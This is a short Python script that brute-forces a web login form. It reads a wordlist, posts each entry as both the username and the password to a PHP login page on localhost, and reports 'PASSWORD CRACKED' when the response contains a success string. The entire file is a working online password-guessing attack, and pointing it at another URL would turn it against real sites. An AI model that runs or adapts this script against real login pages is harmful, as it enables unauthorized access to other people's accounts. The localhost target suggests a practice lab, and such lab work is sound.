import requests
from time import sleep
import sys
import os

args = sys.argv

if len(args) == 2:
    worldlist = args[1]

    url = 'http://localhost/php/bf-form-python/connect.php'
    file = open(worldlist, 'r').readlines()
    os.system('clear')

    for passw in file:
        pas = passw.replace('\n','')
        http = requests.post(url, data={'user':pas, 'passw':pas, 'sub':'submit'})
        content = http.content

        if "b'LOGADO!'" in str(content):
            print ('\n' + '\033[0;32m' + '[*] PASSWORD CRACKED: ' + '\033[0;32m' + f'{pas}' + '\033[0;37m' + '\n')
            break
        else:
            print ('\033[0;31m' + '[!!?] PASSWORD INVALID: ' + '\033[0;31m' + f'{pas}' + '\033[0;37m' + '\n')
            sleep(1)

else:
    print('USE: python3 bf-form.py worldlist')
